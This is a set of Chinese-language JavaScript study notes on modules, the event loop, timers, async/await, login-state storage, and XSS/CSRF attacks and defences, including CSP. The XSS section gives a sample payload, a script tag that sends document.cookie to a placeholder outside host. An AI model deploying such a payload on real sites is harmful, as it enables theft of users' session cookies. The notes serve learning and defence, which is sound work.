#### js的import

`a.js `使用 `b.js` 的方法:

`a.js` 内容:

```js
import { method_b } from './b.js';
```

`b.js` 内容:

```js
export method_b(){
    console.log("this is b..")
}
```

```sh
# 说明:
1.如果html 引入js 需要 指明 type=module
<script type="module" src="a.js"></script>

2.如果是浏览器插件,在manifest.json中,需添加:
{
  "background": {
    "service_worker": "background.js",
    "type": "module" // 必须加上这一行
  }
}

```



#### js单线程

```sh
# 浏览器是多进程,每个选项卡是独立的进程 (选项卡出问题不会影响其他的)
# 每个选项卡是渲染进程,有js主线程
# 主线程卡住,则页面的行为都会卡住

#定时器,监听器,async异步函数await结果(promise),都是打包到任务队列,在js主线程空闲时从队列顺序取出执行
	#微任务 async/await 会优先处理
#如果里面的代码执行耗时久,就会卡住主线程,需注意!
```



#### 定时器

```sh
#定时器没有单独开启动子线程

#定时器启动时,js主线程把任务给浏览器内核的辅助线程(定时器触发线程,"数秒"),
#时间到了辅助线程把定时器里的回调函数放进"任务队列"
#最后由js主线程执行

#所以多个定时器,也只会按照js主线程顺序执行,前面的如果阻塞,后面的就不会及时运行
#主线程在执行其他代码,比如sleep了,定时器也不会运行

#不建议js里写多个定时器
```

#### async / await

```sh
#说明:
异步是为了不阻塞js主线程
异步不等并发,真正的并发需要多线程支持
await后面的代码,只有开启别的线程事件,才不会阻塞,才算真正意义的并发
```



#### 保存登录态

```sh
#由 cookie 转向 localstorage 原因
1.cookie容量小,仅4kB, localstorage:5M
2.每次请求携带cookie,浪费性能
3.cookie解析繁琐,localstorage api更现代,操作便利
4.cookie跨域比较麻烦

#安全性
#cookie 较安全,设置了httponly的话,无法轻易被获取 (非常严格的公司,仍然会用cookie保存登录信息)
HttpOnly：禁止任何脚本（包括插件里的脚本）通过 JavaScript 访问这个 Cookie。	
	document.cookies 代码无法访问
	除非用户主动给权限 (如插件里设置允许访问所有网站数据)
#localstorage,无防御机制
数据对网页脚本和插件时透明的,只能手动添加措施:
	token加密存储 (额外强化方式:浏览器指纹绑定)
	缩短有效期与“一次性”令牌,等等..
```



#### xss 和csrf

```sh
#xss
网页上输入的地方能运行js代码,即可能引发xss攻击,窃取cookie等数据
攻击代码:< script src="http://xxx.xx.com?cookie=document.c ookies"></script >
服务端防御:
	1.设置 httponly 属性
	2.检测输入点,过滤 
	3.csp(内容安全策略):告诉浏览器,不运行第三方js脚本,不运行html里的"行内代码"

用户防御:
	1.重要网站使用无痕模式访问且及时退出登录 (确保当前窗口无其他标签页)
#csrf
用户登录A网站,登录态在cookie里
用户访问恶意网站B,B偷偷访问A,则会自动携带A的cookie访问A,引发越权行为
服务端防御:
	1.设置 SameSite 属性 
	2.下发随机令牌,进行校验
用户防御:
	1.重要网站使用无痕模式访问且及时退出登录 (确保当前窗口无其他标签页)
	2.不轻易访问陌生网站,或者使用无痕模式 (确保当前窗口无其他标签页)
```

```sh
#csp策略:
在响应 Header 中加入 Content-Security-Policy 字段。示例:
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com; object-src 'none';
-- default-src 'self': 默认只允许加载本域名下的资源（图片、脚本等）。
-- script-src 'self' https://trusted.com: 脚本只能来自本域名和 trusted.com。
-- object-src 'none': 禁止加载插件（如 Flash）。
```

